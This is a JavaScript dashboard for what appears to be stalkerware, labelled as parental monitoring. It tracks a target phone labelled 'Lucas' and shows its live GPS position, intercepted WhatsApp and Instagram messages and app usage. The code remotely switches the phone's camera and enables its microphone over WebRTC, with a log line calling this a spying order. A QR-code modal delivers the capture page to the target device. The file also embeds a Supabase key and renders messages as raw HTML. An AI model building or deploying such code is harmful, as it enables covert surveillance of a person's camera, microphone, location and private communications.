// Supabase Configuration
const SUPABASE_URL = "https://lhsopkrbfdktjqvzvfgu.supabase.co";
const SUPABASE_KEY = "sb_publishable_fqMsbMKGzUDncTdW7kMLaA_mmROVye4";
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Initialize Dashboard
document.addEventListener('DOMContentLoaded', async () => {
    lucide.createIcons();
    setupNavigation();
    setupCameraListeners();
    setupInstallationModal();
    await fetchInitialData();
    subscribeToChanges();
    renderAppUsage();
});

let activities = [];
let map, marker;

async function fetchInitialData() {
    const { data: logs } = await _supabase
        .from('activity_logs')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(10);
    
    if (logs) {
        activities = logs.map(l => ({
            id: l.id,
            type: l.type,
            title: l.title,
            desc: l.description,
            time: formatTime(l.created_at),
            icon: getIcon(l.type),
            color: getColor(l.type),
            status: l.type === 'alert' ? 'alert' : 'info'
        }));
        renderFeed();
    }

    const { data: status } = await _supabase.from('device_status').select('*').limit(1);
    if (status && status[0]) updateDeviceStatusUI(status[0]);
}

function subscribeToChanges() {
    _supabase.channel('activity_logs_realtime').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'activity_logs' }, payload => {
        const l = payload.new;
        activities.unshift({
            id: l.id, type: l.type, title: l.title, desc: l.description, time: 'Now',
            icon: getIcon(l.type), color: getColor(l.type), status: l.type === 'alert' ? 'alert' : 'info'
        });
        if (activities.length > 10) activities.pop();
        renderFeed();
    }).subscribe();

    _supabase.channel('device_status_realtime').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'device_status' }, payload => {
        updateDeviceStatusUI(payload.new);
        updateMapPosition(payload.new);
    }).subscribe();

    _supabase.channel('messages_realtime').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messages' }, payload => {
        const list = document.getElementById('messages-list');
        if (list) {
            list.insertAdjacentHTML('afterbegin', renderMessage(payload.new));
            lucide.createIcons();
        }
    }).subscribe();
}

function setupNavigation() {
    document.querySelectorAll('.nav-links li').forEach(li => {
        li.addEventListener('click', () => {
            const activeLi = document.querySelector('.nav-links li.active');
            if (activeLi) activeLi.classList.remove('active');
            li.classList.add('active');
            updateView(li.getAttribute('data-page'));
        });
    });
}

async function updateView(page) {
    document.querySelectorAll('.content-section').forEach(s => s.style.display = 'none');
    const activeSection = document.getElementById(`${page}-view`);
    if (!activeSection) return;
    activeSection.style.display = 'block';
    lucide.createIcons();
    
    if (page === 'location') setTimeout(initMap, 100);
    if (page === 'camera') {
        setupCameraStream();
    }
    if (page === 'messages') await fetchInitialMessages();
}

function setupCameraListeners() {
    const btnAudio = document.getElementById('btn-audio');
    const btnFront = document.getElementById('btn-front');
    const btnBack = document.getElementById('btn-back');

    if (btnAudio) {
        btnAudio.addEventListener('click', async () => {
            audioActive = !audioActive;
            btnAudio.classList.toggle('active', audioActive);
            document.getElementById('audio-status').textContent = audioActive ? "Audio ON" : "Audio OFF";
            
            // Send remote command for audio
            await _supabase.from('device_status').update({ audio_active: audioActive }).eq('device_id', 'iphone-lucas-77');
        });
    }

    [btnFront, btnBack].forEach(btn => {
        if (btn) btn.addEventListener('click', async () => {
            document.querySelectorAll('.btn-toggle').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const mode = btn === btnFront ? 'user' : 'environment';
            
            // REMOTE CONTROL: Direct request to target device
            console.log("Sending remote camera switch command:", mode);
            const { error } = await _supabase.from('device_status')
                .update({ camera_mode: mode })
                .eq('device_id', 'iphone-lucas-77');
            
            if (error) console.error("Remote control error:", error);
        });
    });
}

function setupInstallationModal() {
    const modal = document.getElementById('setup-modal');
    const btnOpen = document.getElementById('btn-open-setup');
    const btnClose = document.getElementById('btn-close-modal');
    const urlInput = document.getElementById('target-url-display');
    const qrContainer = document.getElementById('qrcode');

    // Enable editing for local IP testing
    urlInput.readOnly = false;

    const targetUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')) + '/target.html';
    urlInput.value = targetUrl;

    const renderQR = (url) => {
        qrContainer.innerHTML = "";
        new QRCode(qrContainer, { text: url, width: 180, height: 180 });
    };

    if (btnOpen) btnOpen.addEventListener('click', () => {
        modal.style.display = 'flex';
        renderQR(urlInput.value);
        if (urlInput.value.includes('localhost')) {
            alert("⚠️ SUR VOTRE TÉLÉPHONE :\nRemplacez 'localhost' par votre IP (ex: 192.168.1.15) dans le champ texte ci-dessous pour que le QR Code fonctionne !");
        }
    });

    urlInput.addEventListener('input', () => renderQR(urlInput.value));

    if (btnClose) btnClose.addEventListener('click', () => modal.style.display = 'none');
    
    const btnCopy = document.getElementById('btn-copy-url');
    if (btnCopy) btnCopy.addEventListener('click', () => {
        urlInput.select();
        document.execCommand('copy');
        btnCopy.textContent = "Copié !";
        setTimeout(() => btnCopy.textContent = "Copier", 2000);
    });
}

// Map, Feed and Camera helpers...
function initMap() {
    if (map) return;
    map = L.map('map').setView([48.8566, 2.3522], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
    marker = L.marker([48.8566, 2.3522]).addTo(map).bindPopup('Cible: Lucas').openPopup();
}

function updateMapPosition(s) {
    if (marker && s.last_latitude) {
        const pos = [s.last_latitude, s.last_longitude];
        marker.setLatLng(pos);
        map.panTo(pos);
    }
}

function renderMessage(m) {
    const time = new Date(m.created_at).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
    const icon = m.platform.toLowerCase() === 'whatsapp' ? 'message-circle' : 'instagram';
    return `<div class="message-bubble">
        <div class="platform-icon ${m.platform.toLowerCase()}"><i data-lucide="${icon}"></i></div>
        <div class="item-content">
            <div class="message-meta"><span class="sender-name">${m.sender}</span><span class="item-time">${time}</span></div>
            <div class="message-content">${m.content}</div>
        </div>
    </div>`;
}

// Camera control
// --- TRUE WEBRTC CAMERA RECEPTION ---
let pc = null;
const webrtcChannel = _supabase.channel('webrtc-room', { config: { broadcast: { self: false } } });

async function setupCameraStream() {
    const videoPlaceholder = document.querySelector('.video-placeholder');
    const liveVideo = document.getElementById('live-video');
    const statusDot = document.querySelector('.status-dot');
    
    // Assure that video is visible
    liveVideo.style.display = 'block';
    if (document.getElementById('remote-live-img')) document.getElementById('remote-live-img').style.display='none';
    
    console.log("Initialisation du récepteur vidéo Parent...");
    
    if (pc) pc.close();
    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    
    // Quand on reçoit le flux, on l'affiche avec le son !
    pc.ontrack = e => {
        console.log("Flux reçu ! Lecture en cours...");
        liveVideo.srcObject = e.streams[0];
        // Ensure volume is on but muted attribute removed so audio plays
        liveVideo.muted = false; 
        liveVideo.volume = 1.0;
        liveVideo.play();
        if (videoPlaceholder) videoPlaceholder.style.display = 'none';
        if (statusDot) {
            statusDot.style.background = '#ef4444';
            statusDot.textContent = 'REC';
        }
    };

    pc.onicecandidate = e => {
        if (e.candidate) {
            webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { candidate: e.candidate } });
        }
    };

    webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
        const data = payload.payload;
        if (data.answer) {
            console.log("Réponse de la cible reçue. Connexion en cours...");
            await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
        } else if (data.candidate && pc) {
            await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
        }
    }).subscribe(async (status) => {
        if (status === 'SUBSCRIBED') {
            console.log("Envoi de l'ordre d'espionnage (Offer)...");
            const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
            await pc.setLocalDescription(offer);
            webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { offer: offer } });
        }
    });
}

function setupCamera(mode, withAudio) {
    // Replaced by real remote streaming above
}

function updateDeviceStatusUI(s) {
    const bv = document.querySelector('.stat-card.battery .stat-value');
    if (bv) bv.textContent = s.battery_level + '%';
}

function renderFeed() {
    const feed = document.getElementById('activity-feed');
    if (!feed) return;
    feed.innerHTML = activities.map(item => `
        <div class="feed-item ${item.status}">
            <div class="item-icon" style="background: ${item.color}20; color: ${item.color}"><i data-lucide="${item.icon}"></i></div>
            <div class="item-content"><div class="item-title">${item.title}</div><div class="item-desc">${item.desc}</div></div>
            <div class="item-time">${item.time}</div>
        </div>
    `).join('');
    lucide.createIcons();
}

function formatTime(d) { return new Date(d).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }); }
function getIcon(t) { return t === 'app' ? 'smartphone' : t === 'alert' ? 'shield-alert' : 'info'; }
function getColor(t) { return t === 'alert' ? '#ef4444' : '#6366f1'; }
function renderAppUsage() {
    const appList = document.getElementById('app-usage-list');
    if (!appList) return;
    
    const apps = [
        { name: 'TikTok', time: '2h 15m', percentage: 75, color: '#ff0050' },
        { name: 'Instagram', time: '1h 45m', percentage: 60, color: '#e1306c' },
        { name: 'Snapchat', time: '1h 10m', percentage: 40, color: '#fffc00' }
    ];

    appList.innerHTML = apps.map(app => `
        <div class="app-item">
            <div class="app-progress-container">
                <div class="app-meta">
                    <span class="app-name" style="color:white; font-size:0.9rem;">${app.name}</span>
                    <span class="app-time" style="color:#666; font-size:0.8rem;">${app.time}</span>
                </div>
                <div class="progress-bar" style="background: rgba(255,255,255,0.05); height: 6px; border-radius: 3px; margin-top: 5px; overflow: hidden;">
                    <div class="progress-fill" style="width: ${app.percentage}%; background: ${app.color}; height: 100%; border-radius: 3px;"></div>
                </div>
            </div>
        </div>
    `).join('');
}

async function fetchInitialMessages() {
    const { data: msgs, error } = await _supabase
        .from('messages')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(20);
    
    if (msgs) {
        const list = document.getElementById('messages-list');
        if (list) {
            list.innerHTML = msgs.map(renderMessage).join('');
            lucide.createIcons();
        }
    }
}
